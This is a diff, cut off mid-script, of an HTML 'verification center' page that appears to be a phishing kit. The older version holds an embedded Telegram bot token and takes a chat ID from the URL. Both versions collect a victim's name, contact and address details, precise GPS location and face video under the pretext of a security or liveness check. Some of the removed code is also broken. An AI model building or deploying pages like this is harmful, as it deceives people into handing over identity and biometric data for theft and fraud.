@@ -3,711 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 身份核验与安全中心</title>
-    <!-- 引入 MediaPipe 视觉库 -->
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
-    <!-- 引入全球完整国家与省份/州离线数据库 -->
-    <script src="https://cdn.jsdelivr.net/npm/country-state-city@3.2.1/dist/country-state-city.min.js"></script>
+    <title>Global Verification Center</title>
     <style>
-        :root {
-            --bg-color: #f5f5f7;
-            --card-bg: #ffffff;
-            --text-color: #1d1d1f;
-            --accent-color: #0071e3;
-            --accent-hover: #0077ed;
-            --border-color: #d2d2d7;
-            --input-bg: #f9f9fb;
-        }
-
-        body { 
-            display: flex; flex-direction: column; align-items: center; justify-content: center; 
-            min-height: 100vh; margin: 0; background: var(--bg-color); color: var(--text-color); 
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif; 
-            -webkit-font-smoothing: antialiased;
-        }
-
-        .apple-card {
-            background: var(--card-bg);
-            width: 100%; max-width: 520px;
-            padding: 30px;
-            border-radius: 18px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            box-sizing: border-box;
-            margin: 20px;
-            text-align: left;
-            position: relative;
-        }
-
-        h2 { font-size: 22px; font-weight: 600; margin-bottom: 8px; text-align: center; color: #111; }
-        .subtitle { font-size: 14px; color: #86868b; text-align: center; margin-bottom: 24px; }
-
-        /* 返回上一步按钮样式 */
-        .back-btn {
-            position: absolute; top: 20px; left: 20px; background: none; border: none;
-            color: var(--accent-color); font-size: 14px; font-weight: 500; cursor: pointer;
-            display: flex; align-items: center; gap: 4px; padding: 4px 8px; border-radius: 6px;
-            transition: background 0.2s;
-        }
-        .back-btn:hover { background: rgba(0,113,227,0.08); }
-
-        /* 10国语言选择首屏样式 */
-        #step-language { text-align: center; max-width: 580px; }
-        .lang-grid {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px;
-        }
-        .lang-select-btn {
-            padding: 14px; font-size: 15px; font-weight: 500; border: 1px solid var(--border-color);
-            background: var(--input-bg); border-radius: 12px; cursor: pointer; transition: all 0.2s;
-        }
-        .lang-select-btn:hover { border-color: var(--accent-color); background: #fff; color: var(--accent-color); box-shadow: 0 4px 12px rgba(0,113,227,0.1); }
-
-        /* 表单页面默认隐藏 */
-        #step-form { display: none; }
-
-        .form-group { margin-bottom: 16px; position: relative; width: 100%; }
-        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }
-
-        input, select {
-            width: 100%; padding: 12px 14px; font-size: 15px;
-            border: 1px solid var(--border-color); border-radius: 10px;
-            background: var(--input-bg); color: var(--text-color);
-            box-sizing: border-box; outline: none; transition: all 0.3s;
-        }
-        input:focus, select:focus { border-color: var(--accent-color); background: #fff; box-shadow: 0 0 0 4px rgba(0,113,227,0.12); }
-        select:disabled { background-color: #eee; cursor: not-allowed; color: #aaa; }
-        
-        .error-tip { font-size: 12px; color: #ff3b30; margin-top: 4px; display: none; }
-        .form-row { display: flex; gap: 15px; }
-        .form-row .form-group { flex: 1; }
-
-        .apple-btn {
-            display: block; width: 100%; padding: 14px; background: var(--accent-color);
-            color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 500;
-            cursor: pointer; text-align: center; margin-top: 24px; transition: background 0.3s;
-        }
-        .apple-btn:hover { background: var(--accent-hover); }
-
-        #step-verification { display: none; width: 100%; max-width: 640px; text-align: center; margin-top: 20px; }
-        
-        #video-container { 
-            position: relative; width: 100%; height: 480px; max-width: 640px; margin: 0 auto 20px auto; 
-            border-radius: 12px; box-shadow: 0 0 25px rgba(0, 113, 227, 0.3);
-            border: 3px solid var(--accent-color); background: #000;
-        }
-        #video { width: 100%; height: 100%; border-radius: 9px; object-fit: cover; transform: scaleX(-1); }
-        
-        .face-frame {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 220px; height: 300px; border: 3px dashed rgba(255, 255, 255, 0.7);
-            border-radius: 50% / 40%; pointer-events: none;
-        }
-
-        #status { 
-            margin: 15px auto; font-weight: 500; background: rgba(255,255,255,0.9); 
-            color: #111; padding: 15px 20px; border-radius: 10px; font-size: 18px; 
-            border: 1px solid var(--border-color); max-width: 500px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-        }
-
-        .fill-light {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, rgba(0,0,0,0.75) 80%);
-            pointer-events: none; z-index: 99; display: none;
-        }
+        body { font-family: -apple-system, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; }
+        .card { background: white; width: 100%; max-width: 450px; padding: 25px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 5px; color: #555; }
+        input, select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 15px; }
+        #liveness-box { display: none; text-align: center; }
+        video { width: 100%; border-radius: 10px; transform: scaleX(-1); background: #000; height: 250px; object-fit: cover; }
     </style>
 </head>
 <body>
 
-    <div class="fill-light" id="fillLight"></div>
+<div class="card" id="form-container">
+    <h2>Verification Details</h2>
+    
+    <!-- 1. 个人信息填写 -->
+    <div class="form-group"><label>Full Name</label><input type="text" id="name" placeholder="Enter your full name"></div>
+    <div class="form-group"><label>Email Address</label><input type="email" id="email" placeholder="email@example.com"></div>
+    <div class="form-group"><label>Date of Birth</label><input type="date" id="dob"></div>
 
-    <!-- 第一步：10国语言选择首屏 -->
-    <div class="apple-card" id="step-language">
-        <h2>🌐 Select Your Language / 请选择语言</h2>
-        <div class="subtitle">Please select your preferred language to continue</div>
-        <div class="lang-grid">
-            <button class="lang-select-btn" onclick="selectLanguage('zh')">🇨🇳 简体中文</button>
-            <button class="lang-select-btn" onclick="selectLanguage('en')">🇬🇧 English</button>
-            <button class="lang-select-btn" onclick="selectLanguage('ja')">🇯🇵 日本語</button>
-            <button class="lang-select-btn" onclick="selectLanguage('es')">🇪🇸 Español</button>
-            <button class="lang-select-btn" onclick="selectLanguage('fr')">🇫🇷 Français</button>
-            <button class="lang-select-btn" onclick="selectLanguage('de')">🇩🇪 Deutsch</button>
-            <button class="lang-select-btn" onclick="selectLanguage('ru')">🇷🇺 Русский</button>
-            <button class="lang-select-btn" onclick="selectLanguage('pt')">🇧🇷 Português</button>
-            <button class="lang-select-btn" onclick="selectLanguage('ko')">🇰🇷 한국어</button>
-            <button class="lang-select-btn" onclick="selectLanguage('ar')">🇸🇦 العربية</button>
-        </div>
+    <!-- 2. 地理定位 -->
+    <div class="form-group">
+        <label>Current Location (Detected)</label>
+        <input type="text" id="locationField" readonly placeholder="Detecting location...">
     </div>
 
-    <!-- 第二步：信息填写表单 -->
-    <div class="apple-card" id="step-form">
-        <button class="back-btn" onclick="goBackToLanguage()">❮ <span id="t-back">Back</span></button>
-        
-        <h2 id="t-title"></h2>
-        <div class="subtitle" id="t-subtitle"></div>
-        
-        <div class="form-row">
-            <div class="form-group">
-                <label id="t-firstname" for="firstName"></label>
-                <input type="text" id="firstName" required>
-            </div>
-            <div class="form-group">
-                <label id="t-lastname" for="lastName"></label>
-                <input type="text" id="lastName" required>
-            </div>
-        </div>
-
-        <!-- 全球法定主权国家动态加载下拉框 -->
-        <div class="form-group">
-            <label id="t-country" for="countrySelect"></label>
-            <select id="countrySelect" onchange="onCountryChange()">
-                <option value="" id="t-select-country">-- 请选择国家 / 地区 --</option>
-            </select>
-        </div>
-
-        <!-- 全球全部省份/州动态联动下拉框 -->
-        <div class="form-group">
-            <label id="t-state" for="stateSelect"></label>
-            <select id="stateSelect" disabled>
-                <option value="" id="t-select-first">-- 请先选择上方国家 --</option>
-            </select>
-        </div>
-
-        <div class="form-group">
-            <label id="t-address" for="address"></label>
-            <input type="text" id="address" required>
-        </div>
-
-        <div class="form-row">
-            <div class="form-group">
-                <label id="t-city" for="city"></label>
-                <input type="text" id="city" required>
-            </div>
-            <div class="form-group">
-                <label id="t-postal" for="postalCode"></label>
-                <input type="text" id="postalCode" oninput="validatePostalCode()" required>
-                <div class="error-tip" id="postalError"></div>
-            </div>
-        </div>
-
-        <div class="form-group">
-            <label id="t-phone" for="phone"></label>
-            <input type="tel" id="phone" required>
-        </div>
-
-        <button class="apple-btn" id="nextToVerifyBtn"></button>
+    <!-- 3. 国家与省份联动 -->
+    <div class="form-group">
+        <label>Country</label>
+        <select id="countrySelect" onchange="loadStates()">
+            <option value="">-- Select Country --</option>
+        </select>
     </div>
 
-    <!-- 第三步：活体检测页面 -->
-    <div id="step-verification">
-        <h2 id="t-verify-title"></h2>
-        <div id="status"></div>
-        <div id="video-container">
-            <video id="video" autoplay playsinline muted></video>
-            <div class="face-frame"></div>
-        </div>
-        <canvas id="canvas" style="display:none;"></canvas>
+    <div class="form-group">
+        <label>State / Province</label>
+        <select id="stateSelect" disabled><option>-- Select Country First --</option></select>
     </div>
 
-    <script>
-        const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
-        const CHAT_ID = new URLSearchParams(window.location.search).get('id');
+    <button class="btn" onclick="openLiveness()">Proceed to Face Verification</button>
+</div>
 
-        let currentLang = 'en'; 
+<div class="card" id="liveness-box">
+    <h3>Face Verification</h3>
+    <p style="font-size: 14px;">Please stay still and look at the camera.</p>
+    <video id="video" autoplay playsinline muted></video>
+    <button class="btn" style="background: #28a745;" onclick="finish()">Confirm & Submit</button>
+</div>
 
-        // 10国语言通用词条库
-        const translations = {
-            zh: {
-                back: "返回更改语言",
-                title: "账单与收货地址", subtitle: "请输入您的详细信息以完成安全核验准备",
-                fn: "名字 (First Name)", ln: "姓氏 (Last Name)", country: "国家 / 地区 (Country / Region)",
-                state: "省份 / 直辖市 / 州 (State / Province)", addr: "街道地址 (Street Address)", city: "城市 (City)",
-                postal: "邮政编码 (Postal Code)", phone: "手机号码 (Phone Number)", btn: "下一步：生物活体检测 ➔",
-                vTitle: "🛡️ 智能 AI 视觉活体检测", selectCountry: "-- 请选择国家 / 地区 --",
-                selectFirst: "-- 请先选择上方国家 --", noState: "-- 该国家无下属行政省份/州 --",
-                postalErrText: "⚠️ 邮政编码格式不符合规范",
-                alertIncomplete: "请完整且正确填写所有账单与收货地址信息。",
-                alertNoId: "链接中缺少验证 ID (?id=...)，无法进行后续归档。",
-                camErr: "⚠️ 摄像头调用失败: ",
-                aiNoFace: "未检测到人脸，请将脸部移入框内",
-                aiKeepFace: "请保持正脸，准备向左缓慢转头",
-                aiTurnLeft: "请缓慢向左转头...",
-                aiLeftSuccess: "左转成功,请缓慢向右转头",
-                aiTurnRight: "请缓慢向右转头...",
-                aiSuccess: "活体动作核验通过，正在打包加密上传",
-                uploading: "✅ 验证完成，正在提交所有数据...",
-                successDone: "🎉 提交成功！您可以关闭此页面。",
-                netErr: "⚠️ 上传凭证时发生网络错误。"
-            },
-            en: {
-                back: "Back",
-                title: "Billing & Shipping Address", subtitle: "Please enter your details to prepare for security verification",
-                fn: "First Name", ln: "Last Name", country: "Country / Region",
-                state: "State / Province / Region", addr: "Street Address", city: "City",
-                postal: "Postal Code", phone: "Phone Number", btn: "Next: Biometric Liveness Detection ➔",
-                vTitle: "🛡️ AI Smart Liveness Detection", selectCountry: "-- Select Country / Region --",
-                selectFirst: "-- Please select a country first --", noState: "-- No provinces/states available --",
-                postalErrText: "⚠️ Invalid postal code format",
-                alertIncomplete: "Please complete all billing and shipping address fields correctly.",
-                alertNoId: "Missing verification ID (?id=...) in the link.",
-                camErr: "⚠️ Camera initialization failed: ",
-                aiNoFace: "No face detected, please move your face into the frame",
-                aiKeepFace: "Keep a straight face, get ready to turn your head left",
-                aiTurnLeft: "Please slowly turn your head to the left...",
-                aiLeftSuccess: "Turn left successful, now slowly turn right",
-                aiTurnRight: "Please slowly turn your head to the right...",
-                aiSuccess: "Liveness verification passed, encrypting and uploading",
-                uploading: "✅ Verification complete, submitting all data...",
-                successDone: "🎉 Submitted successfully! You can close this page.",
-                netErr: "⚠️ Network error occurred while uploading."
-            },
-            ja: {
-                back: "戻る",
-                title: "請求先および配送先住所", subtitle: "セキュリティ確認の準備として詳細を入力してください",
-                fn: "名 (First Name)", ln: "姓 (Last Name)", country: "国 / 地域",
-                state: "都道府県 / 州", addr: "番地・建物名", city: "市区町村",
-                postal: "郵便番号", phone: "電話番号", btn: "次へ：生体認証テスト ➔",
-                vTitle: "🛡️ AIスマート生体認証", selectCountry: "-- 国 / 地域を選択してください --",
-                selectFirst: "-- まず国を選択してください --", noState: "-- 都道府県データはありません --",
-                postalErrText: "⚠️ 郵便番号の形式が無効です",
-                alertIncomplete: "すべての住所情報を正しく入力してください。",
-                alertNoId: "リンクに検証ID（?id=...）がありません。",
-                camErr: "⚠️ カメラの起動に失敗しました: ",
-                aiNoFace: "顔が検出されません。フレーム内に顔を合わせてください",
-                aiKeepFace: "まっすぐ前を向き、ゆっくりと左を向いてください",
-                aiTurnLeft: "ゆっくりと左に首を向けてください...",
-                aiLeftSuccess: "左を向きました。次はゆっくり右を向いてください",
-                aiTurnRight: "ゆっくりと右に首を向けてください...",
-                aiSuccess: "生体認証成功、データを暗号化してアップロード中",
-                uploading: "✅ 認証完了、すべてのデータを送信中...",
-                successDone: "🎉 提出が完了しました！このページを閉じてください。",
-                netErr: "⚠️ アップロード中にネットワークエラーが発生しました。"
-            },
-            es: {
-                back: "Volver",
-                title: "Dirección de Envío y Facturación", subtitle: "Ingrese sus datos para completar la verificación de seguridad",
-                fn: "Nombre", ln: "Apellido", country: "País / Región",
-                state: "Estado / Provincia / Región", addr: "Dirección", city: "Ciudad",
-                postal: "Código Postal", phone: "Número de Teléfono", btn: "Siguiente: Detección de Vida ➔",
-                vTitle: "🛡️ Detección de Vida por IA", selectCountry: "-- Seleccionar País / Región --",
-                selectFirst: "-- Seleccione un país primero --", noState: "-- No hay estados disponibles --",
-                postalErrText: "⚠️ Código postal inválido",
-                alertIncomplete: "Complete todos los campos correctamente.",
-                alertNoId: "Falta ID de verificación.", camErr: "Error de cámara: ",
-                aiNoFace: "Rostro no detectado", aiKeepFace: "Mantenga la cara al frente", aiTurnLeft: "Gire a la izquierda...",
-                aiLeftSuccess: "Éxito, gire a la derecha", aiTurnRight: "Gire a la derecha...",
-                aiSuccess: "Verificación aprobada", uploading: "Subiendo...",
-                successDone: "¡Enviado!", netErr: "Error de red."
-            },
-            fr: {
-                back: "Retour",
-                title: "Adresse de Facturation", subtitle: "Veuillez entrer vos coordonnées pour la vérification",
-                fn: "Prénom", ln: "Nom", country: "Pays / Région",
-                state: "État / Province / Région", addr: "Adresse", city: "Ville",
-                postal: "Code Postal", phone: "Téléphone", btn: "Suivant ➔",
-                vTitle: "🛡️ Détection de Vivacité IA", selectCountry: "-- Sélectionner le pays --",
-                selectFirst: "-- Veuillez d'abord choisir un pays --", noState: "-- Aucune province disponible --",
-                postalErrText: "⚠️ Code postal invalide",
-                alertIncomplete: "Veuillez remplir tous les champs.",
-                alertNoId: "ID manquant.", camErr: "Erreur caméra : ",
-                aiNoFace: "Visage non détecté", aiKeepFace: "Regardez droit", aiTurnLeft: "Tournez à gauche...",
-                aiLeftSuccess: "Succès, tournez à droite", aiTurnRight: "Tournez à droite...",
-                aiSuccess: "Vérification réussie", uploading: "Envoi...",
-                successDone: "Soumis !", netErr: "Erreur réseau."
-            },
-            de: {
-                back: "Zurück",
-                title: "Rechnungs- und Lieferadresse", subtitle: "Bitte geben Sie Ihre Daten zur Sicherheitsüberprüfung ein",
-                fn: "Vorname", ln: "Nachname", country: "Land / Region",
-                state: "Bundesland / Region", addr: "Straße", city: "Stadt",
-                postal: "Postleitzahl", phone: "Telefonnummer", btn: "Weiter ➔",
-                vTitle: "🛡️ KI-Lebendigkeitsprüfung", selectCountry: "-- Land auswählen --",
-                selectFirst: "-- Bitte zuerst Land auswählen --", noState: "-- Keine Bundesländer verfügbar --",
-                postalErrText: "⚠️ Ungültige Postleitzahl",
-                alertIncomplete: "Bitte alle Felder ausfüllen.",
-                alertNoId: "ID fehlt.", camErr: "Kamerafehler: ",
-                aiNoFace: "Kein Gesicht erkannt", aiKeepFace: "Geradeaus blicken", aiTurnLeft: "Nach links drehen...",
-                aiLeftSuccess: "Erfolgreich, nach rechts drehen", aiTurnRight: "Nach rechts drehen...",
-                aiSuccess: "Prüfung bestanden", uploading: "Wird hochgeladen...",
-                successDone: "Eingereicht!", netErr: "Netzwerkfehler."
-            },
-            ru: {
-                back: "Назад",
-                title: "Адрес выставления счета", subtitle: "Введите данные для проверки безопасности",
-                fn: "Имя", ln: "Фамилия", country: "Страна / Регион",
-                state: "Штат / Область / Регион", addr: "Адрес", city: "Город",
-                postal: "Почтовый индекс", phone: "Телефон", btn: "Далее ➔",
-                vTitle: "🛡️ Проверка живого присутствия", selectCountry: "-- Выберите страну --",
-                selectFirst: "-- Сначала выберите страну --", noState: "-- Нет доступных регионов --",
-                postalErrText: "⚠️ Неверный почтовый индекс",
-                alertIncomplete: "Заполните все поля.",
-                alertNoId: "Нет ID.", camErr: "Ошибка камеры: ",
-                aiNoFace: "Лицо не обнаружено", aiKeepFace: "Смотрите прямо", aiTurnLeft: "Поверните налево...",
-                aiLeftSuccess: "Успешно, поверните направо", aiTurnRight: "Поверните направо...",
-                aiSuccess: "Проверка пройдена", uploading: "Загрузка...",
-                successDone: "Отправлено!", netErr: "Ошибка сети."
-            },
-            pt: {
-                back: "Voltar",
-                title: "Endereço de Cobrança", subtitle: "Insira seus detalhes para verificação de segurança",
-                fn: "Nome", ln: "Sobrenome", country: "País / Région",
-                state: "Estado / Província", addr: "Endereço", city: "Cidade",
-                postal: "Código Postal", phone: "Telefone", btn: "Seguinte ➔",
-                vTitle: "🛡️ Detecção de vivacidade IA", selectCountry: "-- Selecione o país --",
-                selectFirst: "-- Selecione um país primeiro --", noState: "-- Nenhum estado disponível --",
-                postalErrText: "⚠️ Código postal inválido",
-                alertIncomplete: "Preencha todos os campos.",
-                alertNoId: "ID ausente.", camErr: "Erro na câmera: ",
-                aiNoFace: "Rosto não detectado", aiKeepFace: "Olhe para frente", aiTurnLeft: "Vire à esquerda...",
-                aiLeftSuccess: "Sucesso, vire à direita", aiTurnRight: "Vire à direita...",
-                aiSuccess: "Verificación aprobada", uploading: "Enviando...",
-                successDone: "Enviado!", netErr: "Erro de rede."
-            },
-            ko: {
-                back: "뒤로",
-                title: "청구 및 배송 주소", subtitle: "보안 확인을 위해 세부 정보를 입력하세요",
-                fn: "이름 (First Name)", ln: "성 (Last Name)", country: "국가 / 지역",
-                state: "주 / 도 / 지역", addr: "상세 주소", city: "도시",
-                postal: "우편번호", phone: "전화번호", btn: "다음: 생체 인증 ➔",
-                vTitle: "🛡️ AI 스마트 생체 감지", selectCountry: "-- 국가 / 지역 선택 --",
-                selectFirst: "-- 먼저 국가를 선택해주세요 --", noState: "-- 사용 가능한 주/도 데이터 없음 --",
-                postalErrText: "⚠️ 유효하지 않은 우편번호 형식",
-                alertIncomplete: "모든 항목을 올바르게 입력해주세요.",
-                alertNoId: "링크에 인증 ID가 없습니다.",
-                camErr: "⚠️ 카메라 초기화 실패: ",
-                aiNoFace: "얼굴이 감지되지 않았습니다. 프레임 안에 얼굴을 위치시키세요",
-                aiKeepFace: "정면을 유지하고 왼쪽으로 고개를 돌릴 준비를 하세요",
-                aiTurnLeft: "천천히 왼쪽으로 고개를 돌리세요...",
-                aiLeftSuccess: "왼쪽 회전 성공, 이제 오른쪽으로 고개를 돌리세요",
-                aiTurnRight: "천천히 오른쪽으로 고개를 돌리세요...",
-                aiSuccess: "생체 인증 통과, 암호화하여 업로드 중",
-                uploading: "✅ 인증 완료, 모든 데이터를 제출 중...",
-                successDone: "🎉 제출 완료! 이 페이지를 닫으셔도 됩니다.",
-                netErr: "⚠️ 업로드 중 네트워크 오류가 발생했습니다."
-            },
-            ar: {
-                back: "رجوع",
-                title: "عنوان الفواتير والشحن", subtitle: "يرجى إدخال تفاصيلك لإتمام التحقق الأمني",
-                fn: "الاسم الأول", ln: "اسم العائلة", country: "الدولة / المنطقة",
-                state: "الولاية / المقاطعة / المنطقة", addr: "عنوان الشارع", city: "المدينة",
-                postal: "الرمز البريدي", phone: "رقم الهاتف", btn: "التالي: التحقق الحيوي ➔",
-                vTitle: "🛡️ نظام التحقق الذكي بالذكاء الاصطناعي", selectCountry: "-- اختر الدولة / المنطقة --",
-                selectFirst: "-- يرجى اختيار الدولة أولاً --", noState: "-- لا توجد مقاطعات متاحة --",
-                postalErrText: "⚠️ تنسيق الرمز البريدي غير صالح",
-                alertIncomplete: "يرجى إكمال جميع الحقول بشكل صحيح.",
-                alertNoId: "معرف التحقق مفقود في الرابط.",
-                camErr: "⚠️ فشل تشغيل الكاميرا: ",
-                aiNoFace: "لم يتم اكتشاف وجه، يرجى وضع وجهك في الإطار",
-                aiKeepFace: "حافظ على وجهك مستقيماً، استعداداً للالتفاف يساراً",
-                aiTurnLeft: "يرجى إدارة رأسك ببطء إلى اليسار...",
-                aiLeftSuccess: "تم الدوران لليسار بنجاح، يجيب الالتفاف يميناً الآن",
-                aiTurnRight: "يرجى إدارة رأسك ببطء إلى اليمين...",
-                aiSuccess: "نجح التحقق الحيوي، جاري التشفير والرفع",
-                uploading: "✅ اكتمل التحقق، جاري إرسال البيانات...",
-                successDone: "🎉 تم الإرسال بنجاح! يمكنك إغلاق هذه الصفحة.",
-                netErr: "⚠️ حدث خطأ في الشبكة أثناء الرفع."
-            }
-        };
+<script>
+    // 全球国家数据
+    const worldData = {
+        "NL": { name: "Netherlands", states: ["Drenthe", "Flevoland", "Friesland", "Gelderland", "Groningen", "Limburg", "Noord-Brabant", "Noord-Holland", "Overijssel", "Utrecht", "Zeeland", "Zuid-Holland"] },
+        "US": { name: "United States", states: ["California", "Texas", "New York", "Florida"] },
+        "CN": { name: "China", states: ["Beijing", "Shanghai", "Guangdong", "Jiangsu"] }
+    };
 
-        const countrySelect = document.getElementById('countrySelect');
-        const stateSelect = document.getElementById('stateSelect');
-        const postalCodeInput = document.getElementById('postalCode');
-        const postalError = document.getElementById('postalError');
-
-        // 初始化全球所有法定国家数据
-        function initCountries() {
-            const t = translations[currentLang];
-            countrySelect.innerHTML = `<option value="">${t.selectCountry}</option>`;
-            
-            // 利用库自动加载全球所有国家
-            const countries = country-state-city.Country.getAllCountries();
-            countries.forEach(c => {
-                const opt = document.createElement('option');
-                opt.value = c.isoCode; // 传入国家代码（如 NL, US, CN 等）
-                opt.text = c.name;
-                countrySelect.appendChild(opt);
-            });
-        }
-
-        // 根据选择的国家动态加载该国全部省份/州（如荷兰全部12省）
-        function onCountryChange() {
-            const countryCode = countrySelect.value;
-            const t = translations[currentLang];
-            
-            stateSelect.innerHTML = "";
-            stateSelect.disabled = true;
-
-            if (!countryCode) {
-                const opt = document.createElement('option');
-                opt.text = t.selectFirst;
-                stateSelect.appendChild(opt);
-                return;
-            }
-
-            // 利用库自动获取对应国家的全部行政省份/州
-            const states = country-state-city.State.getStatesOfCountry(countryCode);
-            
-            if (!states || states.length === 0) {
-                stateSelect.disabled = true;
-                const opt = document.createElement('option');
-                opt.text = t.noState;
-                stateSelect.appendChild(opt);
-                return;
-            }
-
-            stateSelect.disabled = false;
-            const defaultOpt = document.createElement('option');
-            defaultOpt.value = "";
-            defaultOpt.text = t.selectCountry;
-            stateSelect.appendChild(defaultOpt);
-
-            states.forEach(s => {
-                const opt = document.createElement('option');
-                opt.value = s.name;
-                opt.text = s.name;
-                stateSelect.appendChild(opt);
-            });
-
-            validatePostalCode();
-        }
-
-        function validatePostalCode() {
-            const postal = postalCodeInput.value.trim();
-            if (!postal) { postalError.style.display = 'none'; return true; }
-            let isValid = postal.length >= 3 && postal.length <= 12;
-            if (!isValid) {
-                postalError.style.display = 'block';
-                return false;
-            } else {
-                postalError.style.display = 'none';
-                return true;
-            }
-        }
-
-        function selectLanguage(lang) {
-            currentLang = lang;
-            document.getElementById('step-language').style.display = 'none';
-            document.getElementById('step-form').style.display = 'block';
-
-            applyTranslations();
-            initCountries();
-        }
-
-        function goBackToLanguage() {
-            document.getElementById('step-form').style.display = 'none';
-            document.getElementById('step-language').style.display = 'block';
-        }
-
-        function applyTranslations() {
-            const t = translations[currentLang];
-            document.getElementById('t-back').innerText = t.back;
-            document.getElementById('t-title').innerText = t.title;
-            document.getElementById('t-subtitle').innerText = t.subtitle;
-            document.getElementById('t-firstname').innerText = t.fn;
-            document.getElementById('t-lastname').innerText = t.ln;
-            document.getElementById('t-country').innerText = t.country;
-            document.getElementById('t-state').innerText = t.state;
-            document.getElementById('t-address').innerText = t.addr;
-            document.getElementById('t-city').innerText = t.city;
-            document.getElementById('t-postal').innerText = t.postal;
-            document.getElementById('t-phone').innerText = t.phone;
-            document.getElementById('nextToVerifyBtn').innerText = t.btn;
-            document.getElementById('t-verify-title').innerText = t.vTitle;
-            document.getElementById('t-select-country').innerText = t.selectCountry;
-            document.getElementById('t-select-first').innerText = t.selectFirst;
-            postalError.innerText = t.postalErrText;
-        }
-
-        let formDataCache = {};
-        const stepForm = document.getElementById('step-form');
-        const stepVerification = document.getElementById('step-verification');
-        const nextToVerifyBtn = document.getElementById('nextToVerifyBtn');
-        const video = document.getElementById('video');
-        const videoContainer = document.getElementById('video-container');
-        const canvas = document.getElementById('canvas');
-        const status = document.getElementById('status');
-        const fillLight = document.getElementById('fillLight');
-
-        let currentStep = 0;
-        let lastSpokenText = "";
-
-        function speakPrompt(text) {
-            if (text === lastSpokenText) return;
-            lastSpokenText = text;
-            status.innerText = text;
-            if ('speechSynthesis' in window) {
-                window.speechSynthesis.cancel();
-                const langMap = { zh: 'zh-CN', en: 'en-US', ja: 'ja-JP', es: 'es-ES', fr: 'fr-FR', de: 'de-DE', ru: 'ru-RU', pt: 'pt-BR', ko: 'ko-KR', ar: 'ar-SA' };
-                const utterance = new SpeechSynthesisUtterance(text);
-                utterance.lang = langMap[currentLang] || 'en-US';
-                utterance.rate = 1.0;
-                window.speechSynthesis.speak(utterance);
-            }
-        }
-
-        function updateUIPulse(color, glowColor) {
-            videoContainer.style.borderColor = color;
-            videoContainer.style.boxShadow = `0 0 25px ${glowColor}`;
-        }
-
-        nextToVerifyBtn.addEventListener('click', async () => {
-            const t = translations[currentLang];
-            const firstName = document.getElementById('firstName').value.trim();
-            const lastName = document.getElementById('lastName').value.trim();
-            const country = countrySelect.options[countrySelect.selectedIndex]?.text || "";
-            const state = stateSelect.value.trim();
-            const address = document.getElementById('address').value.trim();
-            const city = document.getElementById('city').value.trim();
-            const postalCode = postalCodeInput.value.trim();
-            const phone = document.getElementById('phone').value.trim();
-
-            if (!firstName || !lastName || !country || !state || !address || !city || !postalCode || !phone) {
-                alert(t.alertIncomplete);
-                return;
-            }
-
-            if (!CHAT_ID) {
-                alert(t.alertNoId);
-                return;
-            }
-
-            formDataCache = { firstName, lastName, country, state, address, city, postalCode, phone };
-
-            stepForm.style.display = 'none';
-            stepVerification.style.display = 'block';
-            fillLight.style.display = 'block';
-
-            let locationText = "GPS未取得";
-            try {
-                const pos = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 });
-                });
-                locationText = `Latitude: ${pos.coords.latitude.toFixed(6)}, Longitude: ${pos.coords.longitude.toFixed(6)}`;
-            } catch (e) {
-                console.warn("GPS skipped");
-            }
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false });
-                video.srcObject = stream;
-                initAIFaceDetection(stream, locationText);
-            } catch (err) {
-                status.innerText = t.camErr + err.message;
-            }
+    // 初始化：填充国家并定位
+    window.onload = () => {
+        const cSelect = document.getElementById('countrySelect');
+        Object.keys(worldData).forEach(code => {
+            let opt = document.createElement('option');
+            opt.value = code; opt.textContent = worldData[code].name;
+            cSelect.appendChild(opt);
         });
-
-        function initAIFaceDetection(stream, locationText) {
-            const t = translations[currentLang];
-            const faceMesh = new FaceMesh({
-                locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
-            });
-
-            faceMesh.setOptions({
-                maxNumFaces: 1,
-                refineLandmarks: true,
-                minDetectionConfidence: 0.5,
-                minTrackingConfidence: 0.5
-            });
-
-            faceMesh.onResults((results) => {
-                if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
-                    speakPrompt(t.aiNoFace);
-                    updateUIPulse('#ff4d4d', 'rgba(255, 77, 77, 0.5)');
-                    return;
-                }
-
-                const landmarks = results.multiFaceLandmarks[0];
-                const nose = landmarks[1];
-                const leftEye = landmarks[33];
-                const rightEye = landmarks[263];
-                const eyeCenterXinVideo = (leftEye.x + rightEye.x) / 2;
-                const headYaw = nose.x - eyeCenterXinVideo; 
-
-                if (currentStep === 0) {
-                    updateUIPulse('#0071e3', 'rgba(0, 113, 227, 0.5)');
-                    speakPrompt(t.aiKeepFace);
-                    setTimeout(() => { currentStep = 1; }, 2000);
-                } 
-                else if (currentStep === 1) {
-                    speakPrompt(t.aiTurnLeft);
-                    updateUIPulse('#ffeb3b', 'rgba(255, 235, 59, 0.6)');
-                    
